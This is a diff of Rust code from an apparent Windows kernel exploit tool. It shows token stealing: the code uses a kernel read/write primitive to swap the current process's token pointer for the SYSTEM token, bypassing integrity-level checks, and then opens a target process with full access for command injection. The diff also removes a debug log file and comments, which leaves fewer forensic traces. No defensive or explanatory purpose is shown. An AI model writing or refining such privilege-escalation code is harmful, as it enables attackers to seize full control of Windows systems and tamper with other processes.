@@ -186,13 +186,7 @@ fn escalate_eproc(krw: &KernelRW, eproc: u64, sys_present: u64, sys_enabled: u64
     Ok(())
 }
 
-pub fn log_debug(msg: &str) {
-    use std::io::Write;
-    if let Ok(mut f) = std::fs::OpenOptions::new().create(true).append(true).open("C:\\Windows\\Temp\\mmdevlib_kernel.log") {
-        let _ = writeln!(f, "[cmd_inject] {}", msg);
-        let _ = f.sync_all();
-    }
-}
+pub fn log_debug(_msg: &str) {}
 
 fn enable_debug_privilege() {
     use windows_sys::Win32::Security::{AdjustTokenPrivileges, LookupPrivilegeValueW, SE_PRIVILEGE_ENABLED, TOKEN_ADJUST_PRIVILEGES, TOKEN_PRIVILEGES, LUID_AND_ATTRIBUTES};
@@ -285,22 +279,13 @@ pub fn cmd_inject(dev: &Device, target_pid: Option<u64>) -> Result<()> {
     let sys_token = sys_token_ref & !0xF;
     let sys_present = krw.kread(sys_token + TOKEN_SEP_PRESENT)?;
     let sys_enabled = krw.kread(sys_token + TOKEN_SEP_ENABLED)?;
-    
-    // Backup our original privileges
-    // Backup our original token pointer
     let our_token_ptr_addr = walk.our_eproc + EPROC_TOKEN;
     let our_orig_token_ptr = krw.kread(our_token_ptr_addr)?;
-
-    // Temporarily replace our token pointer with the SYSTEM token pointer
-    // This gives us true SYSTEM identity and bypasses all Integrity Level checks
     krw.kwrite(our_token_ptr_addr, sys_token_ref)?;
-
     let hproc = unsafe { OpenProcess(PROCESS_ALL_ACCESS, 0, final_pid as u32) };
     let err = unsafe { GetLastError() };
 
     if hproc.is_null() {
-        // Restore before bailing
-        // Restore before bailing
         krw.kwrite(our_token_ptr_addr, our_orig_token_ptr).ok();
         bail!("OpenProcess PID={} WinErr={}", final_pid, err);
     }
